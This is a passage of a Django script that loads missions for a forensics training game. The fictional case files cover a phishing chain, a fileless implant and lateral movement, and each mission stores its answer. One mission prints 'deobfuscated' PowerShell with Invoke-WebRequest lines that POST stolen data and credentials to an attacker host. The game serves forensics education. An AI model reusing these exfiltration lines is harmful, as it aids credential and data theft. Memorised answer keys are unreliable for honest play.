"""
python manage.py load_missions
Loads all 15 Digital Forensic Hunt missions into the database.
Run after migrate. Safe to re-run (clears and reloads).
"""
from django.core.management.base import BaseCommand
from game.models import Mission, MissionFile, MissionLog

MISSIONS = [
  # ─────────────── LEVEL 1 ───────────────
  {'order':1,'code':'1.1','difficulty':'ROOKIE',
   'title':'LEVEL 1.1 — GHOST LOGIN',
   'level_group':"LEVEL 1: THE INTERN'S GHOST",
   'brief':'<span class="mission-meta">CASE FILE: VaultEdge Financial</span><br>Former intern <span class="mission-target">Marcus Hale</span> accessed proprietary trading algorithms 3 weeks post-offboarding. A successful login under his account occurred at <strong>02:14 AM</strong> — four days after IT deactivated it. Identify the <span class="mission-target">source workstation hostname</span>.',
   'target_hint':'Find the WorkstationName field in the 4624 successful logon event',
   'answer':'ws-finance-04','time_limit':360,'hint_cost':150,'total_clues':4,
   'hint_text':'Parse Event ID 4624 in Security.evtx. WorkstationName field contains the hostname.',
   'files':[
     {'path':'C/Windows/System32/winevt/Logs','filename':'Security.evtx.txt',
      'content':"""[EVENT LOG EXPORT — VaultEdge Financial]
EventID: 4624 | Successful Logon
  TimeCreated:    2031-03-12 02:14:33 UTC
  TargetUserName: mhale
  LogonType:      3  (Network Logon — suspicious)
  WorkstationName: WS-FINANCE-04
  IpAddress:      192.168.10.44

EventID: 4625 | Failed Logon (x2 before success)
  TargetUserName: mhale | IpAddress: 192.168.10.44

NOTE: mhale account deactivated 2031-03-08 17:30:00 UTC
      Ghost login: 3 days 8 hrs post-deactivation.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'Event 4624: mhale logged in at 02:14 UTC. LogonType 3 (network). WorkstationName: WS-FINANCE-04. Two failed attempts first — credential brute-force.'},
     {'path':'C/Windows/System32/winevt/Logs','filename':'Security_4722.evtx.txt',
      'content':"""EventID: 4722 | User Account Enabled
  TimeCreated:    2031-03-12 02:11:04 UTC
  TargetUserName: mhale
  SubjectUserName: svc_helpdesktemp
  Note: Account re-enabled 3 min before ghost login.
  svc_helpdesktemp — DeltaCore Solutions contractor DC-0047.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'CRITICAL: Event 4722 — mhale re-enabled at 02:11 by svc_helpdesktemp (DeltaCore DC-0047) — three minutes before ghost login.'},
     {'path':'ActiveDirectory','filename':'AD_UserExport_mhale.txt',
      'content':"""CN=Marcus Hale,OU=Alumni,DC=VAULTEDGE,DC=local
Account Status: DISABLED (2031-03-08 17:30 UTC)
Last Logon:     2031-03-12 02:14:33 UTC  POST-DEACTIVATION
Department:     Algorithmic Trading (Intern — OFFBOARDED)""",
      'has_clue':True,'clue_tag':'AD',
      'clue_text':'AD confirms: mhale DISABLED 2031-03-08. Last logon 3 days later — covert re-enable confirmed.'},
     {'path':'ActiveDirectory','filename':'IP_Geolocation.txt',
      'content':"""192.168.10.44 = INTERNAL — VaultEdge HQ, Floor 3, Finance Wing
Workstation: WS-FINANCE-04

Marcus Hale badge: LAST EXIT 2031-03-08 17:22
Marcus Hale badge: NO ENTRY 2031-03-12
Confirmed 400+ miles away on breach date.
Attacker was physically on-site.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'WS-FINANCE-04 is inside HQ Finance Wing. Marcus had no badge entry on breach day — someone else was physically present.'},
   ],
   'logs':[
     {'order':1,'time_label':'02:11:04','level':'CRIT','message':'AD: DISABLED account mhale re-enabled — UNAUTHORIZED'},
     {'order':2,'time_label':'02:13:58','level':'WARN','message':'Failed logon: mhale from 192.168.10.44'},
     {'order':3,'time_label':'02:14:33','level':'CRIT','message':'SUCCESS: Ghost login — mhale via WS-FINANCE-04'},
   ]},

  {'order':2,'code':'1.2','difficulty':'ROOKIE',
   'title':"LEVEL 1.2 — THE USB THAT WASN'T PLUGGED IN",
   'level_group':"LEVEL 1: THE INTERN'S GHOST",
   'brief':'<span class="mission-meta">CASE FILE: VaultEdge Financial — Registry Forensics</span><br>WS-FINANCE-04 is imaged. Dig into the Registry and USB artifact logs. Identify the <span class="mission-target">USB device serial number</span> used for exfiltration.',
   'target_hint':'Find the USB serial in SYSTEM\\CurrentControlSet\\Enum\\USBSTOR',
   'answer':'001CC0EC336ADE31&0','time_limit':320,'hint_cost':150,'total_clues':4,
   'hint_text':'USBSTOR registry hive — the serial is the subkey name under the device vendor entry.',
   'files':[
     {'path':'Registry','filename':'SYSTEM_USBSTOR.reg',
      'content':"""[HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR]
Device: Kingston DataTraveler 3.0 64GB
  VendorID: 0951  ProductID: 1666
  Serial Key: 001CC0EC336ADE31&0
  First Connected: 2031-03-12 02:19:07 UTC
  Last Arrival:    2031-03-12 02:19:07 UTC""",
      'has_clue':True,'clue_tag':'REGISTRY',
      'clue_text':'USBSTOR: Kingston DataTraveler 64GB serial 001CC0EC336ADE31&0 connected at 02:19:07 UTC — 5 min after ghost login.'},
     {'path':'Registry','filename':'NTUSER_RecentDocs.reg',
      'content':"""RecentDocs — accessed after USB mount:
  algo_v3_FINAL.py       02:20:14 UTC
  backtest_engine.py     02:20:31 UTC
  signal_generator.py    02:20:45 UTC
  risk_model_prod.py     02:21:02 UTC
  Q1_AlphaModel.ipynb    02:21:19 UTC
  HFT_LatencyTest.ipynb  02:21:44 UTC
6 proprietary algorithm files accessed in 3m 30s.""",
      'has_clue':True,'clue_tag':'REGISTRY',
      'clue_text':'RecentDocs: 6 .py/.ipynb trading algorithm files accessed 02:20–02:21 UTC — immediately after USB insertion.'},
     {'path':'Logs','filename':'setupapi.dev.log',
      'content':"""[2031-03-12 02:19:07] USB 001CC0EC336ADE31&0 installed — drive F:\\
[2031-03-12 02:24:56] Safe removal complete.
Dwell time: 5 min 48 sec""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'setupapi: USB 001CC0EC336ADE31&0 mounted 02:19:07, removed 02:24:56. 5m 48s dwell — enough to copy all 6 files.'},
     {'path':'Logs','filename':'OSINT_USB_Pastebin.txt',
      'content':"""Pastebin search: serial 001CC0EC336ADE31
Found in post by handle: _r3dshift (2030-09-14)
"Kingston 64GB SN 001CC0EC336ADE31 — clean, tested, ready for field work. DM for rates."
Context: darknet marketplace listing — USB Stealth Delivery Toolkit.
This device was deliberately pre-staged for covert ops.""",
      'has_clue':True,'clue_tag':'OSINT',
      'clue_text':'Pastebin: USB serial posted by _r3dshift alongside darknet marketplace listing 6 months ago. Pre-staged covert operations device.'},
   ],
   'logs':[
     {'order':1,'time_label':'02:19:07','level':'CRIT','message':'USB mass storage inserted — Kingston 001CC0EC336ADE31'},
     {'order':2,'time_label':'02:20:14','level':'WARN','message':'File access: algo_v3_FINAL.py'},
     {'order':3,'time_label':'02:24:56','level':'INFO','message':'USB safe removal complete'},
   ]},

  {'order':3,'code':'1.3','difficulty':'AGENT',
   'title':'LEVEL 1.3 — THE DIGITAL FOOTPRINT',
   'level_group':"LEVEL 1: THE INTERN'S GHOST",
   'brief':'<span class="mission-meta">CASE FILE: VaultEdge Financial — OSINT</span><br>Handle <span class="mission-target">_r3dshift</span> is your only thread. Conduct a full OSINT sweep. Identify the <span class="mission-target">contractor company name</span> linked to the attacker.',
   'target_hint':'Find the contractor company that had VaultEdge access and links to _r3dshift',
   'answer':'deltacore solutions','time_limit':300,'hint_cost':150,'total_clues':4,
   'hint_text':'EXIF GPS from the archived profile image points to a co-working space. Cross-reference with VaultEdge vendor records.',
   'files':[
     {'path':'OSINT','filename':'Sherlock_Results.txt',
      'content':"""[SHERLOCK SCAN — _r3dshift]
GitHub: FOUND (deleted — Wayback cache available)
  Repo briefly public: commit "add VE targeting config — DO NOT PUSH"
  targets.conf: host=vaultedge-internal.local user=svc_helpdesktemp
Twitter/X: FOUND (deleted)
HackerForums: FOUND (archived)""",
      'has_clue':True,'clue_tag':'OSINT',
      'clue_text':'GitHub: _r3dshift repo exposed "VE targeting config" with svc_helpdesktemp — direct link to account used in ghost login.'},
     {'path':'OSINT','filename':'Twitter_EXIF.txt',
      'content':"""EXIF — @_r3dshift profile image (archive.org):
  GPSLatitude:  37.7849 N
  GPSLongitude: 122.4094 W
  REVERSE GEOCODE → 450 Townsend St, SF CA 94107
  Venue: Runway Innovation Hub (co-working space)

VAULTEDGE VENDOR MATCH:
  DeltaCore Solutions — 450 Townsend St Ste 200
  Service: Security Consulting | Contact: DC-0047
  Contract: 2030-09-01 to 2031-03-01 (expired 11 days before breach)""",
      'has_clue':True,'clue_tag':'OSINT',
      'clue_text':'EXIF GPS → Runway Hub co-working space → VaultEdge vendor: DeltaCore Solutions. Contract expired 11 days before breach.'},
     {'path':'OSINT','filename':'HackerForums_Cache.txt',
      'content':"""[hacker-forums.net — _r3dshift — 2030-10-19 — ARCHIVED]
"...the inside contact has a helpdesk svc acct already.
Time the AD re-enable to <5min before logon window closes."
Reply syn4ck: "Classic play."
_r3dshift: "Yeah should be clean.""",
      'has_clue':True,'clue_tag':'OSINT',
      'clue_text':'Forum post: _r3dshift discusses AD re-enable timing and "inside contact with helpdesk svc acct" — matches svc_helpdesktemp from ghost login.'},
     {'path':'OSINT','filename':'VaultEdge_VendorList.txt',
      'content':"""VAULTEDGE APPROVED VENDORS:
DC-0047  DeltaCore Solutions  Security Consulting  J.Mercer
  Badge access: Finance Floor 3 (where WS-FINANCE-04 is located)
  Contract expired: 2031-03-01""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'DeltaCore Solutions (DC-0047) had badge access to Finance Floor 3 — same floor as WS-FINANCE-04. Contract expired 11 days before breach.'},
   ],
   'logs':[
     {'order':1,'time_label':'OSINT','level':'WARN','message':'GitHub commit: VaultEdge targeting config with svc_helpdesktemp'},
     {'order':2,'time_label':'OSINT','level':'WARN','message':'EXIF GPS → DeltaCore Solutions, 450 Townsend St SF'},
     {'order':3,'time_label':'OSINT','level':'CRIT','message':'DeltaCore = VaultEdge vendor DC-0047 — Finance Floor 3 access'},
   ]},

  {'order':4,'code':'1.4','difficulty':'AGENT',
   'title':'LEVEL 1.4 — INBOX OF LIES',
   'level_group':"LEVEL 1: THE INTERN'S GHOST",
   'brief':'<span class="mission-meta">CASE FILE: VaultEdge Financial — Email Forensics</span><br>A phishing email was sent to Marcus Hale posing as IT. Trace its true origin. Identify the <span class="mission-target">credential harvesting domain</span>.',
   'target_hint':'Decode the redirect chain to find the final harvester domain',
   'answer':'vaultedge-secure-verify.com','time_limit':280,'hint_cost':150,'total_clues':4,
   'hint_text':'Trace Received: headers bottom-to-top. Then follow the bit.ly redirect chain to the final POST destination.',
   'files':[
     {'path':'Email','filename':'phishing_email_raw.txt',
      'content':"""From: it-helpdesk@vaultedge-financial.com
To:   m.hale@vaultedge-financial.com
Subject: [URGENT] Credential Verification Required

Received: from 45.142.212.100 (ORIGIN — external)
Received: via smtp-relay.hostingprovider.net (185.220.101.47)
Received: by mail.vaultedge-financial.com

SPF:   FAIL — 185.220.101.47 not authorized
DKIM:  FAIL — signature mismatch
DMARC: FAIL

Body: Please verify VPN credentials before offboarding:
  >> http://bit.ly/3xR9pQm""",
      'has_clue':True,'clue_tag':'EMAIL',
      'clue_text':'SPF FAIL + DKIM FAIL + DMARC FAIL. True origin: 45.142.212.100 (external). Spoofed sender through rogue SMTP relay.'},
     {'path':'Email','filename':'BitLy_Redirect_Trace.txt',
      'content':"""[URL TRACE — bit.ly/3xR9pQm]
Hop 1: bit.ly/3xR9pQm
  → 301 → https://secure-auth-redirect.pages.dev/r?t=vev
Hop 2: secure-auth-redirect.pages.dev
  → 302 → https://vaultedge-secure-verify.com/vpn/login
Hop 3: vaultedge-secure-verify.com  CREDENTIAL HARVESTER
  Form: POST /collect (username, password, mfa_token)
  Pixel-perfect VaultEdge VPN clone

WHOIS: vaultedge-secure-verify.com
  Registered: 2031-02-24 (48 hrs before email)
  Hosting: Flyservers S.A. — bulletproof hosting""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'3-hop redirect chain terminates at vaultedge-secure-verify.com — credential harvester. Domain registered 48hrs before email.'},
     {'path':'Email','filename':'WHOIS_Crypto_Payment.txt',
      'content':"""Domain payment: vaultedge-secure-verify.com
Method: Bitcoin
Wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

NEXUS HISTORY MATCH:
  NEXUS Case #NC-2029-0441 — PHANTOM CIRCUIT affiliate
  NEXUS Case #NC-2028-1108 — PHANTOM CIRCUIT affiliate
Wallet active — last transaction: 2031-03-01""",
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'Payment wallet matches two prior NEXUS cases — PHANTOM CIRCUIT affiliate. Wallet still active as of 2031-03-01.'},
     {'path':'Email','filename':'Credential_Capture_Log.txt',
      'content':"""[vaultedge-secure-verify.com server log — legal intercept]
2031-02-26 12:01:44 UTC
  POST /collect: username=m.hale
  ip_source: 10.0.0.77 (Marcus work machine)
Credentials relayed to PHANTOM CIRCUIT C2 within seconds.
These credentials used in ghost login 14 days later.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'Marcus submitted credentials to harvester 12:01 on 26 Feb. Those credentials used in ghost login 14 days later — confirmed chain.'},
   ],
   'logs':[
     {'order':1,'time_label':'11:34:07','level':'CRIT','message':'Phishing email delivered — SPF/DKIM/DMARC all FAIL'},
     {'order':2,'time_label':'12:01:44','level':'CRIT','message':'Credentials POST to vaultedge-secure-verify.com'},
   ]},

  {'order':5,'code':'1.5','difficulty':'SPECIALIST',
   'title':'LEVEL 1.5 — FOLLOW THE COIN',
   'level_group':"LEVEL 1: THE INTERN'S GHOST",
   'brief':'<span class="mission-meta">CASE FILE: VaultEdge Financial — Blockchain Forensics</span><br>The Bitcoin wallet links to PHANTOM CIRCUIT. Trace the money. Identify the <span class="mission-target">shell company name</span> whose exchange account received post-mix funds.',
   'target_hint':'Trace post-tumbler output to the exchange account — find the shell company name',
   'answer':'cerulean holdings llc','time_limit':260,'hint_cost':150,'total_clues':4,
   'hint_text':'Follow the tumbler output address to the exchange deposit. The subpoena response file names the account holder.',
   'files':[
     {'path':'Blockchain','filename':'Wallet_Overview.txt',
      'content':"""Wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Balance: 0 BTC (fully spent out) | Total received: 1.847 BTC
First seen: 2028-11-04 | Last active: 2031-03-01

Recent transactions:
  IN  +0.15 BTC  2031-02-23  domain registration payment
  IN  +0.42 BTC  2031-01-17  PHANTOM CIRCUIT payout #7
  OUT -0.57 BTC  2031-03-01  bc1qmix... (TUMBLER)""",
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'Wallet fully drained through tumbler. Inbound payments labelled as PHANTOM CIRCUIT payouts — operational wallet confirmed.'},
     {'path':'Blockchain','filename':'CIOH_Clustering.txt',
      'content':"""COMMON-INPUT-OWNERSHIP ANALYSIS
7 related addresses — same controlling entity:
  bc1q4xz...  domain registration ops x3
  bc1qk9p...  darknet marketplace payments
  bc1qd77...  bulletproof hosting (Flyservers)
  bc1qmix...  TUMBLER INPUT
All co-spent in at least one transaction.""",
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'CIOH: 7 addresses controlled by one entity. Covers domain registration, darknet payments, bulletproof hosting — unified PHANTOM CIRCUIT financial infrastructure.'},
     {'path':'Blockchain','filename':'Tumbler_Analysis.txt',
      'content':"""Tumbler: Helix-variant custom mixer
  Input:  bc1qmix1...  0.57 BTC at 2031-03-01 14:22 UTC
  Output: bc1qpost... 0.56 BTC at 2031-03-01 21:47 UTC
  Delta: 7h 25min | Fee: ~1.7% | Output amount varied

Post-mix destination: bc1qpost1r4...
  Known exchange deposit address
  Subpoena filed: 2031-03-08""",
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'Tumbler: 7h 25min wash, 1.7% fee. Post-mix → exchange deposit bc1qpost1r4. Subpoena filed to unmask account holder.'},
     {'path':'Blockchain','filename':'Subpoena_Response.txt',
      'content':"""[LEGAL RESPONSE — Exchange Subpoena #SUB-2031-0314]
Account Name:   Cerulean Holdings LLC
Jurisdiction:   Seychelles (low-regulation)
Registered Agent: M. Fontaine & Associates
  Same agent for: Veridia Capital Ltd, Stormglass Ventures LLC,
  NullVector Advisory — all linked to @nullvector.io

NOTE: @nullvector.io = PHANTOM CIRCUIT internal email domain.
CODENAME EXTRACTED FROM CORRESPONDENCE: OPERATION LACUNA""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'SUBPOENA: Cerulean Holdings LLC (Seychelles). Agent links to @nullvector.io — PHANTOM CIRCUIT domain. OPERATION LACUNA codename recovered.'},
   ],
   'logs':[
     {'order':1,'time_label':'CHAIN','level':'WARN','message':'0.57 BTC → Helix-variant tumbler'},
     {'order':2,'time_label':'CHAIN','level':'CRIT','message':'Post-mix → Cerulean Holdings LLC → @nullvector.io'},
     {'order':3,'time_label':'CHAIN','level':'CRIT','message':'OPERATION LACUNA codename recovered — threat ORANGE'},
   ]},

  # ─────────────── LEVEL 2 ───────────────
  {'order':6,'code':'2.1','difficulty':'SPECIALIST',
   'title':'LEVEL 2.1 — THE LIVING MEMORY',
   'level_group':'LEVEL 2: BLACKSITE PROTOCOL',
   'brief':'<span class="mission-meta">CASE FILE: Project HELIX — Memory Forensics</span><br>A fileless implant lives only in RAM — no file on disk. You have a memory dump. Identify the <span class="mission-target">C2 domain</span> hardcoded in the injected shellcode.',
   'target_hint':'Find the C2 beacon domain extracted from the injected memory region',
   'answer':'sync.telemetry-cdn.net','time_limit':300,'hint_cost':150,'total_clues':4,
   'hint_text':'Run malfind on the suspicious svchost PID. The C2 domain is a typosquatted CDN name in the shellcode strings.',
   'files':[
     {'path':'MemoryAnalysis','filename':'vol3_pslist.txt',
      'content':"""[VOLATILITY 3 — pslist — HELIX-WS-01.raw]
PID   PPID  Name
720   612   svchost.exe  (parent: services.exe) NORMAL
1144  4892  svchost.exe  (parent: explorer.exe) *** ANOMALY ***
4892  1740  explorer.exe

ANOMALY: PID 1144 spawned from explorer.exe
Expected parent: services.exe — PROCESS MASQUERADING.""",
      'has_clue':True,'clue_tag':'MEMORY',
      'clue_text':'svchost PID 1144 has parent explorer.exe — WRONG. Legitimate svchost always spawns from services.exe. Process masquerading = fileless injection.'},
     {'path':'MemoryAnalysis','filename':'vol3_malfind_1144.txt',
      'content':"""[malfind — PID 1144 svchost.exe]
Address: 0x1f0000
Protection: PAGE_EXECUTE_READWRITE
0x001f0000  4d 5a 90 00  MZ...
INJECTED REGION: 144KB | Entropy: 7.82 (HIGH — packed)
No backing file on disk — purely memory-resident.
SHA-256: e3b4c9f1a2d07e6b5c8f3a1d2e4b9c0f7a8d3e6b2c5f1a9""",
      'has_clue':True,'clue_tag':'MEMORY',
      'clue_text':'malfind: PID 1144 — 144KB PAGE_EXECUTE_READWRITE injected PE. No backing file. Entropy 7.82 = packed payload. Classic fileless injection.'},
     {'path':'MemoryAnalysis','filename':'Shellcode_Strings.txt',
      'content':"""[STRINGS — injected region 0x001f0000]
0x2380   sync.telemetry-cdn[.]net
0x23C0   /beacon/v2/collect
0x2480   interval=43&jitter=12
0x2580   PHANTOM_IMPLANT_v3.1
0x2600   operator_id=LACE

NOTE: sync.telemetry-cdn[.]net = TYPOSQUAT of telemetry-cdn.net
Registered: 2030-11-29 (3 months pre-deployment)
Beacon 43s jitter=12 — custom implant, NOT off-shelf RAT""",
      'has_clue':True,'clue_tag':'MEMORY',
      'clue_text':'C2 domain: sync.telemetry-cdn[.]net (typosquatted CDN). Beacon 43s ±12s jitter. Operator: LACE. PHANTOM_IMPLANT_v3.1 — bespoke nation-state tool.'},
     {'path':'MemoryAnalysis','filename':'VT_Result.txt',
      'content':"""[VIRUSTOTAL — SHA-256: e3b4c9f1...]
Detections: 3/72
  Kaspersky:   Trojan.Win64.PhantomRAT.a
  CrowdStrike: Win/malicious_confidence_90
Notes: Matches PHANTOM CIRCUIT TTP profile.
  Operator tag LACE seen in HELIX-adjacent targeting.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'VirusTotal: 3/72 — PhantomRAT. Matches PHANTOM CIRCUIT TTP profile. Operator LACE previously tied to HELIX-adjacent campaigns.'},
   ],
   'logs':[
     {'order':1,'time_label':'MEMORY','level':'WARN','message':'svchost PID 1144 — anomalous parent explorer.exe'},
     {'order':2,'time_label':'MEMORY','level':'CRIT','message':'PAGE_EXECUTE_READWRITE injection at 0x001f0000'},
     {'order':3,'time_label':'MEMORY','level':'CRIT','message':'C2 extracted: sync.telemetry-cdn[.]net | Operator: LACE'},
   ]},

  {'order':7,'code':'2.2','difficulty':'SPECIALIST',
   'title':'LEVEL 2.2 — WHISPERS IN THE WIRE',
   'level_group':'LEVEL 2: BLACKSITE PROTOCOL',
   'brief':'<span class="mission-meta">CASE FILE: Project HELIX — Network Analysis</span><br>Six days of PCAP. C2 traffic tunnelled inside HTTPS. A second infected host detected. Identify the <span class="mission-target">hostname</span> of the second infected machine.',
   'target_hint':'Match the JA3 TLS fingerprint to find the second infected host',
   'answer':'helix-dc-01','time_limit':280,'hint_cost':150,'total_clues':4,
   'hint_text':'Filter by C2 IP, extract JA3 fingerprint, scan all TLS traffic for hosts sharing that exact fingerprint.',
   'files':[
     {'path':'PCAP','filename':'Wireshark_C2_Filter.txt',
      'content':"""[Filter: ip.addr == 185.234.219.77 AND tls]
Source hosts connecting to C2:
  10.10.1.44  helix-ws-01  821 connections  (PRIMARY)
  10.10.2.12  helix-dc-01   26 connections  (SECOND HOST)

TLS Certificate: Self-signed | 10-year validity | CN mismatch
Attacker-controlled infrastructure confirmed.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'C2 IP 185.234.219.77: TWO source hosts — helix-ws-01 (821 conns) AND helix-dc-01 (26 conns). Self-signed cert = attacker infra.'},
     {'path':'PCAP','filename':'JA3_Analysis.txt',
      'content':"""JA3 fingerprint: 72a7c5b5e456e3f4d8c9f2a1b0e7d3c6
Threat Intel: PHANTOM_IMPLANT_v3.x (HIGH confidence)
4 PHANTOM CIRCUIT campaigns 2029–2031

SCAN — all TLS — JA3 match:
  helix-ws-01   821 matches  PRIMARY INFECTED
  helix-dc-01    26 matches  SECOND INFECTED (domain controller!)""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'JA3 match: PHANTOM_IMPLANT_v3.x. Full scan finds helix-dc-01 (domain controller) with identical fingerprint — second infection confirmed.'},
     {'path':'PCAP','filename':'Beacon_TimeDelta.txt',
      'content':"""Beacon interval analysis (100 samples):
  Mean: 43.2s | StdDev: 5.8s | Min/Max: 37s/52s
  MATCHES shellcode: interval=43&jitter=12

helix-dc-01 beacon: Mean 43.1s StdDev 5.9s
  SAME implant signature on both hosts.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'Statistical beacon analysis: 43.2s ±5.8s matches shellcode config. helix-dc-01 identical pattern — same implant on domain controller.'},
     {'path':'PCAP','filename':'DoH_Secondary_C2.txt',
      'content':"""DNS-over-HTTPS secondary C2:
  POST cloudflare-dns.com — TXT for _cmd.sync.telemetry-cdn.net
Decoded commands (base64 in TXT records):
  "screenshot now"
  "ls /home/helix/"
  "exfil /home/helix/research/PHASE3"

Last command before containment: exfil PHASE3
Exfiltration was 48 HOURS AWAY.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'Secondary C2 via DNS-over-HTTPS. Final decoded command: "exfil /home/helix/research/PHASE3" — 48 hours from execution at detection.'},
   ],
   'logs':[
     {'order':1,'time_label':'PCAP','level':'CRIT','message':'JA3 PHANTOM_IMPLANT on helix-ws-01'},
     {'order':2,'time_label':'PCAP','level':'CRIT','message':'SAME JA3 on helix-dc-01 — domain controller infected!'},
     {'order':3,'time_label':'PCAP','level':'CRIT','message':'DoH decoded: exfil PHASE3 — 48hrs from execution'},
   ]},

  {'order':8,'code':'2.3','difficulty':'EXPERT',
   'title':"LEVEL 2.3 — PATIENT ZERO'S TWIN",
   'level_group':'LEVEL 2: BLACKSITE PROTOCOL',
   'brief':'<span class="mission-meta">CASE FILE: Project HELIX — Lateral Movement</span><br>The domain controller was compromised via lateral movement. Identify the <span class="mission-target">service account name</span> used to pivot to the DC.',
   'target_hint':'Find the service account in Event ID 4648 used for the lateral move',
   'answer':'svc_helix_backup','time_limit':260,'hint_cost':150,'total_clues':4,
   'hint_text':'Search Event ID 4648 (explicit credential logon) on the domain controller. Look for the account used by PID 1144.',
   'files':[
     {'path':'EventLogs_DC','filename':'Security_4648.txt',
      'content':"""EventID: 4648 — Explicit Credential Logon
  TimeCreated:     2031-03-14 03:22:15 UTC
  SubjectUserName: HELIX-WS-01$ (computer account)
  TargetUserName:  svc_helix_backup
  TargetServerName: HELIX-DC-01
  ProcessName:     svchost.exe PID 1144 (THE INJECTED PROCESS)

Malware used svc_helix_backup credentials to authenticate to DC.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'Event 4648: Injected svchost PID 1144 used svc_helix_backup to auth to HELIX-DC-01 via network logon at 03:22 UTC.'},
     {'path':'EventLogs_DC','filename':'System_7045.txt',
      'content':"""EventID: 7045 — New Service Installed
  TimeCreated:  2031-03-14 03:22:44 UTC
  ServiceName:  WMI_HealthService
  ServiceFile:  C:\\Windows\\Temp\\wmih.exe
  StartType:    Auto Start

WMI_HealthService is NOT legitimate. Binary in Temp = rogue dropper.
Installed via WMI using svc_helix_backup — 29s after lateral move.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'Event 7045: Rogue WMI_HealthService installed on DC from Windows\\Temp — implant dropper, 29 seconds after lateral move auth.'},
     {'path':'EventLogs_DC','filename':'AD_ServiceAccount.txt',
      'content':"""Account: svc_helix_backup
Purpose: "Automated backup service"
Privileges: Domain Admins member  !!! MISCONFIGURATION !!!
            Local Admin on ALL workstations
Password age: 716 days (never rotated)
No interactive logon restriction.""",
      'has_clue':True,'clue_tag':'AD',
      'clue_text':'svc_helix_backup: Domain Admin member (MISCONFIGURATION), 716-day-old password. PHANTOM CIRCUIT identified via implant reconnaissance.'},
     {'path':'EventLogs_DC','filename':'GPO_Modification_5136.txt',
      'content':"""EventID: 5136 — GPO Modified
  SubjectUserName: svc_helix_backup
  GPO: Default Domain Policy
Change: WinRM enabled + PSExecutionPolicy=Bypass
  Applied to: ALL workstations in domain

This back door SURVIVES standard reimaging.""",
      'has_clue':True,'clue_tag':'LOG',
      'clue_text':'Event 5136: Default Domain Policy modified by svc_helix_backup — unrestricted PowerShell remoting across all HELIX machines. Survives reimage.'},
   ],
   'logs':[
     {'order':1,'time_label':'03:22:15','level':'CRIT','message':'4648: svc_helix_backup → HELIX-DC-01 via injected svchost'},
     {'order':2,'time_label':'03:22:44','level':'CRIT','message':'7045: Rogue WMI_HealthService installed on DC'},
     {'order':3,'time_label':'03:28:11','level':'CRIT','message':'5136: Default Domain Policy — WinRM enabled globally'},
   ]},

  {'order':9,'code':'2.4','difficulty':'EXPERT',
   'title':'LEVEL 2.4 — THE POISONED SCRIPT',
   'level_group':'LEVEL 2: BLACKSITE PROTOCOL',
   'brief':'<span class="mission-meta">CASE FILE: Project HELIX — Malware Analysis</span><br>The GPO dropped a heavily obfuscated PowerShell script. Deobfuscate it. Identify the <span class="mission-target">secondary exfiltration domain</span> the script POSTs data to.',
   'target_hint':'Deobfuscate two layers to reveal the exfil POST domain',
   'answer':'update-telemetry.io','time_limit':240,'hint_cost':150,'total_clues':4,
   'hint_text':'Layer 1: base64 decode outer wrapper. Layer 2: XOR key 0x4B. Exfil domain is in the POST logic after AES encryption.',
   'files':[
     {'path':'Malware','filename':'GPO_Script_Raw.ps1',
      'content':"""# Raw PowerShell — GPO delivery
# SHA-256: 9a3f1c7e2b5d0e8f4a6c1d3e7b9f2a5c

$a=[System.Convert]::FromBase64String(
  'U3lzdGVtLlJlZmxlY3Rpb24u' +
  'WE9SX0VOQ09ERURfUEFZTE9BRA==')
# Inner payload is XOR encoded — single byte key (brute-force 0x00-0xFF)""",
      'has_clue':True,'clue_tag':'MALWARE',
      'clue_text':'Layer 1: base64 outer wrapper hiding XOR-encoded inner payload. Comment reveals single-byte XOR key — brute forceable. Double-obfuscation to evade SIEM.'},
     {'path':'Malware','filename':'Layer2_Decoded.ps1',
      'content':"""# DEOBFUSCATED — XOR key 0x4B confirmed
# PHANTOM_IMPLANT_v3.1 — PS module

# KEYLOGGER via SetWindowsHookEx
# SCREENSHOT every 90 seconds
# CREDENTIAL DUMP via LSASS memory read

# EXFIL — AES-256 encrypted, HTTP POST:
Invoke-WebRequest -Uri "https://update-telemetry.io/upload" -Method POST -Body $encrypted
Invoke-WebRequest -Uri "https://update-telemetry.io/exfil/creds" -Method POST -Body $encCreds

# AES KEY (hardcoded):
$aesKey = "4A7F3C9E1B5D8F2A6C0E4B8D2F6A0C4E"
$aesIV  = "8B3F7A1C5E9D2F6B" """,
      'has_clue':True,'clue_tag':'MALWARE',
      'clue_text':'DEOBFUSCATED: Keylogger + screenshots every 90s + LSASS cred dump. ALL sent to https://update-telemetry.io — SECOND C2 domain. AES key hardcoded.'},
     {'path':'Malware','filename':'Exfil_Calculation.txt',
      'content':"""Script active: 2031-03-14 03:30 to 2031-03-25 14:45 (11 days)
Screenshot every 90s → ~11,100 files → ~2.33GB total

update-telemetry.io server logs (intercept):
  Successfully transmitted: ~400MB
  Staged but NOT exfiltrated: ~1.9GB

Staging dir: C:\\Windows\\Temp\\.svc\\exfil_queue\\
  Size: 1.887GB — RECOVERABLE""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'11 days active. Only 400MB exfiltrated to update-telemetry.io. 1.887GB still staged on DC staging directory — recoverable data.'},
     {'path':'Malware','filename':'AES_Key_Context.txt',
      'content':"""Hardcoded AES-256-CBC key in deobfuscated script:
  Key: 4A7F3C9E1B5D8F2A6C0E4B8D2F6A0C4E
